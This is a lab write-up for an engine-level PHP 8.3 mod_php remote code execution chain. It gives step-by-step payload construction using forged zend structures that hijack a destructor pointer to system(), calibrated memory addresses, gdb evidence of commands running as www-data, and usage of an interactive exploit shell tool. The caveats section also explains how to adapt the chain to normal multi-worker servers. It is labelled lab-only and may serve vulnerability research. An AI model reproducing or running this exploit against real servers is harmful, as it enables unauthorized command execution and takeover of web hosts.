# PHP2SHELL — mod_php port: calibration and chain notes

Lab: `php2shell-lab/modphp-lab`  
Target SAPI: Apache 2.4.68 + mod_php (prefork), PHP 8.3.33 NTS  
Container: `f2s-apache`, published at `127.0.0.1:18130`

## 1. Lab configuration

- Base image: `php:8.3.33-apache` (Debian trixie, glibc 2.41-12+deb13u4)
- Apache MPM: prefork, deliberately one child:
  - `StartServers 1`, `MinSpareServers 1`, `MaxSpareServers 1`
  - `MaxRequestWorkers 1`, `MaxConnectionsPerChild 0`
  - `KeepAlive On`, `KeepAliveTimeout 30`
- PHP (`/usr/local/etc/php/conf.d/zz-f2s.ini`):
  - `memory_limit=16M`, `post_max_size=64M`, `upload_max_filesize=64M`
  - `session.upload_progress.enabled=1`, `session.upload_progress.cleanup=0`
  - `session.serialize_handler=php`, `display_errors=0`, `max_input_vars=100000`
- App:
  - `app/index.php`: `@unserialize($_POST['data'])` (A side)
  - `app/store.php`: stores `$_POST['p']` in `$_SESSION['p']` and aliases
    `$_SESSION['upload_progress_fk1'] = &$_SESSION['p']` (payload delivery)
  - `/var/www/html/out/` is owned by `www-data` and is the command output channel

## 2. Why the FPM chain ports to mod_php

The chain is the same engine-level bug, not a CMS/plugin gadget:

1. **store**: the app writes a 65500-byte session value. The `php` session
   serializer writes:
   ```text
   p|s:65500:"<payload>";upload_progress_fk1|R:1;
   ```
   The session file is 65537 bytes. The payload contains a forged
   `php_unserialize_data` plus fake zval/reference/array structures at
   absolute addresses.

2. **A**: `@unserialize($_POST['data'])` runs with a 4 MB filler and a
   40,000-element serialized array. `memory_limit=16M` is exhausted during
   the array parse, after `php_var_unserialize_init()` has set
   `BG(unserialize).level = 1` and `BG(unserialize).data = D`. The PHP fatal
   bailout does **not** reset the unserializer globals. Unlike FPM, the
   Apache child does not exit; it survives and keeps the dangling state.

3. **B**: a multipart request carrying `PHP_SESSION_UPLOAD_PROGRESS=fk1`
   makes `php_session_rfc1867_callback()` call `php_session_initialize()`
   **pre-RINIT**. The session `php` decoder calls
   `PHP_VAR_UNSERIALIZE_INIT(var_hash)`. Because `BG(unserialize).level` is
   still 1, it reuses the stale `D` instead of allocating a fresh one.

4. The session file's `upload_progress_fk1|R:1;` resolves to the forged
   zval at `D + 0x2100`:
   - fake `zend_reference` at `D + 0x2180` (rc=0, type 10,
     value = fake array at `D + 0x2200`)
   - fake `HashTable` at `D + 0x2200` with
     `pDestructor = system`, `arData = D + 0x2300` (command string)

5. Replacing the progress key destroys the fake reference: `ZVAL_COPY`
   raises rc to 1, the subsequent `zend_reference_destroy()` reaches
   `zend_array_destroy()`, which calls `pDestructor(arData)` = `system()`.
   The function pointer is called with the command pointer as its first
   argument (`rdi`).

The session read buffer geometry is identical to the FPM lab:

```text
session file marker (file offset 0)  = D - 0x1fe8
struct file offset                  = 0x1fe8
struct payload offset               = 0x1fdd (0x1fe8 - 11-byte prefix)
read buffer zend_string base        = D - 0x2000
V / R / S / CMD                     = D + 0x2100 / 0x2180 / 0x2200 / 0x2300
```

## 3. Calibrated addresses (running lab, master PID 1)

```text
D          = 0x7fdb5ca6c000
system     = 0x7fdb5f919090     (libc system offset 0x53090)
libc base  = 0x7fdb5f8c6000     (system - 0x53090)
struct_off = 0x1fe8
```

Observed on Apache children 18, 95, 169, 251, 269, 332, 423 and 473; the
values are stable across child respawns while the prefork master lives,
because each child is forked from the same master with the same mappings and
deterministic heap layout.

After a container/master restart, recalibrate (Section 6). A fresh master has
new ASLR addresses even though the image and request sequence are identical.

## 4. Evidence

- `evidence/modphp_gdb.out` — gdb on the B request:
  ```text
  VARTMP#1 ... d=0x7fdb5ca6c000 ... marker=('0x7fdb5ca6a018','d-8168','fileoff_if_base=0x1fe8')
  VARTMP#2 ... d=0x7fdb5ca6c000 ...
  RCDTOR ref=0x7fdb5ca6e180 rc=0 type_info=10
  SYSTEM rdi=0x7fdb5ca6e300 cmd=rm -f /var/www/html/out/evid.txt; (id) > /var/www/html/out/evid.txt 2>&1
  Program received signal SIGABRT
  #5 zend_array_destroy
  #6 zend_reference_destroy
  #7 zend_hash_update
  ```
- `evidence/modphp_uid.txt` — HTTP output file proof:
  ```text
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  ```
- `evidence/modphp_id.txt` — one-shot tool run.
- `evidence/modphp_multi.txt` — three sequential commands in one session.
- `evidence/modphp_shell.txt` — `help` + `shell` mode.
- `evidence/modphp_session.txt` — 65537-byte session file layout.
- `evidence/modphp_libc.txt` — glibc version and `system` offset.

## 5. The interactive tool

`modphp_shell.py` is the single interactive exploit file. It contains the
payload builder, multipart drivers, the chain scheduler, and a REPL.

```text
python3 modphp_shell.py                 # REPL
python3 modphp_shell.py --exec 'id'    # one command
```

REPL:

```text
help
info
target http://127.0.0.1:18130
set d 0x7fdb5ca6c000
set system 0x7fdb5f919090
set struct_off 0x1fe8
exec id
exec uname -a
shell
quit
```

Each `exec` performs the full store → A → B cycle. B aborts the Apache child
after `system()` returns; the prefork master respawns it. The output file is
written before the abort and fetched over HTTP.

### Output-wrapper pitfall

The first working version used:

```sh
(rm -f OUT; CMD) > OUT 2>&1
```

That is wrong: the shell opens/truncates `OUT` **before** executing the
subshell, then the `rm -f OUT` unlinks the freshly opened file. `CMD` writes
to the now-unlinked file descriptor and the file is never visible. The fix is
to remove the old file **outside** the redirected subshell:

```sh
rm -f OUT; (CMD) > OUT 2>&1
```

This is why the first tool run returned 404 on `/out/o.txt` while the gdb
trace clearly showed `SYSTEM` being called.

## 6. Recalibration procedure

The current lab is already calibrated. To recalibrate after recreating the
container/master:

1. Start the lab (`./run.sh`) and get the single Apache child PID:

   ```sh
   PID=$(docker exec f2s-apache sh -c 'pgrep -P 1 -a | head -1 | cut -d" " -f1')
   ```

2. Build a dummy store/A/B set with placeholder addresses. You can import
   the tool's builders:

   ```sh
   python3 - <<'PY'
   import sys; sys.path.insert(0,'.')
   import modphp_shell as m
   cfg = dict(m.DEFAULTS)
   dummy = 0x414141414141
   cmd = b"id > /var/www/html/out/cal.txt"
   payload = m.build_payload(dummy, dummy, cfg['length'], cfg['struct_off'], cmd)
   open('/tmp/cal_store.bin','wb').write(
       m.multipart(m.STORE_BOUNDARY, [(b'p', payload, None)]))
   elems = b''.join(b'i:%d;a:1:{i:0;i:1;}' % i for i in range(cfg['elems']))
   open('/tmp/cal_a.bin','wb').write(m.multipart(m.A_BOUNDARY, [
       (b'filler', b'Q'*cfg['filler'], None),
       (b'data', b'a:%d:{%s}' % (cfg['elems'], elems), None)]))
   open('/tmp/cal_b.bin','wb').write(m.multipart(m.B_BOUNDARY, [
       (b'PHPSESSID', cfg['sid'].encode(), None),
       (b'PHP_SESSION_UPLOAD_PROGRESS', b'fk1', None),
       (b'f', b'', b'a')]))
   PY
   ```

3. Store, run A, attach gdb, then send B:

   ```sh
   python3 ../fpm-lab/http_post.py /store.php /tmp/cal_store.bin f2smod00000000000000000000001 18130
   python3 ../fpm-lab/http_post.py /index.php /tmp/cal_a.bin f2smod00000000000000000000001 18130
   docker cp cal_modphp.gdb f2s-apache:/tmp/cal_modphp.gdb
   docker exec -d f2s-apache sh -c "gdb -batch -p $PID -x /tmp/cal_modphp.gdb > /tmp/cal.out 2>&1"
   sleep 2.5
   python3 ../fpm-lab/http_post.py /index.php /tmp/cal_b.bin f2smod00000000000000000000001 18130
   sleep 1.5
   docker cp f2s-apache:/tmp/cal.out ./cal.out
   ```

   The B request will crash on the dummy addresses after the calibration
   breakpoint; that is expected.

4. Read the calibration from `cal.out`:

   - `VARTMP#1 ... d=0x...` → new `D`
   - `marker=(..., 'fileoff_if_base=0x...')` → new `struct_off`
   - `Breakpoint 2 at 0x...` → new libc `system` address

5. Pass the values to the tool (or update `DEFAULTS`):

   ```sh
   python3 modphp_shell.py --d 0x... --system 0x... --struct-off 0x... --exec id
   ```

   In the REPL: `set d ...`, `set system ...`, `set struct_off ...`.

## 7. Caveats

- The lab uses `MaxRequestWorkers 1`. The A request and the B request must be
  handled by the **same** Apache child, because `BG(unserialize)` is
  per-process. With a normal multi-worker prefork pool, pin A and B to one
  child (keep-alive connection to the same child, or retry until the same
  child handles both) or add an app-level info leak and a per-child address
  strategy.
- The command output channel is a web-readable file, not a real interactive
  socket. Each `exec` is a fresh store → A → B cycle because B aborts the
  child. `shell` mode is a convenience loop, not a persistent session.
- The B request intentionally aborts the child. Apache logs
  `zend_mm_heap corrupted` and `child pid ... exit signal Abort (6)`; the
  master respawns.
- The exploit is an engine-level UAF → type confusion → destructor hijack,
  not an app-specific gadget chain. The app preconditions (`store.php` and
  an `@unserialize` endpoint with a controllable OOM) are the delivery
  vehicle; the target still needs a PHP 8.3.x mod_php/FPM worker and the
  session upload-progress path.
- Authorized lab work only.
